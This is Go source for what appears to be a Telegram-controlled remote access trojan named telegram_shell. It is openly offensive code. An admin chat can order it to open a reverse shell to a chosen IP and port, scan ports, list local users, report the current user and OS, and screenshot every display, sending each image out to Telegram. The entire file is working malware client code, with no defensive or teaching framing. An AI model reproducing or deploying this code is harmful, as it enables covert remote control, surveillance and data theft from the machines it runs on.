package main

import (
	"fmt"
	"image/png"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"

	"github.com/ashkenazi1/telegram_shell/config"
	"github.com/ashkenazi1/telegram_shell/hacking"
	"github.com/ashkenazi1/telegram_shell/telegram"
	"github.com/kbinani/screenshot"
)

func main() {
	bot := telegram.GetBot(config.TelegramAPIKey, config.TelegramDebugMode)

	updates, _ := bot.GetUpdates()
	for update := range updates {
		if update.Message == nil {
			continue
		}

		chatUserID := update.Message.Chat.ID

		if chatUserID == config.TelegramAdminID {

			cmd := strings.Split(update.Message.Text, " ")
			cmd = cmd[1:]

			if update.Message.IsCommand() {

				if update.Message.Command() == "reverse_shell" {
					if len(cmd) < 2 {
						bot.SendMessage(chatUserID, "Please provide IP address and Port where you listen.\nFor example /reverse_shell 127.0.0.1 1337")
					} else {
						hacking.Connect(cmd[0], cmd[1])
						bot.SendMessage(chatUserID, "Nothing will stop us now")

					}
				}

				if update.Message.Command() == "port_scan" {
					if len(cmd) < 3 {
						bot.SendMessage(chatUserID, "Please provide Host and Port range.\nFor example /port_scan 127.0.0.1 1 65535")
					} else {
						startPort, _ := strconv.Atoi(cmd[1])
						endPort, _ := strconv.Atoi(cmd[2])
						openPorts := hacking.PortScan(cmd[0], startPort, endPort)
						bot.SendMessage(chatUserID, fmt.Sprintf("Open ports: %d", openPorts))
					}
				}
				if update.Message.Command() == "os" {
					os := runtime.GOOS
					switch os {
					case "darwin":
						bot.SendMessage(chatUserID, fmt.Sprintf("My Os is : Mac OS"))
					default:
						fmt.Printf("%s.\n", os)
					}
				}
				if update.Message.Command() == "get_users" {
					users, err := hacking.GetUsers()
					if err != nil {
						bot.SendMessage(chatUserID, fmt.Sprintf("Error: %s", err))
					} else {
						for _, usr := range users {
							bot.SendMessage(chatUserID, fmt.Sprintf("User: %s", usr))
						}
					}
				}
				if update.Message.Command() == "whoami" {
					user, err := user.Current()
					if err != nil {
						bot.SendMessage(chatUserID, fmt.Sprintf("Error: %s", err))
					}
					bot.SendMessage(chatUserID, user.Name+" (id: "+user.Uid+")")
				}
				if update.Message.Command() == "screenshot" {
					n := screenshot.NumActiveDisplays()

					for i := 0; i < n; i++ {
						bounds := screenshot.GetDisplayBounds(i)

						img, err := screenshot.CaptureRect(bounds)
						if err != nil {
							panic(err)
						}
						fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
						file, _ := os.Create(fileName)
						defer file.Close()
						png.Encode(file, img)

						bot.SendPhoto(chatUserID, fileName)
						os.Remove(fileName)
					}
				}
				if update.Message.Command() == "help" || update.Message.Command() == "start" {
					bot.UpdateKeyboard(config.TelegramAdminID)
				}

			}
		}
	}
}
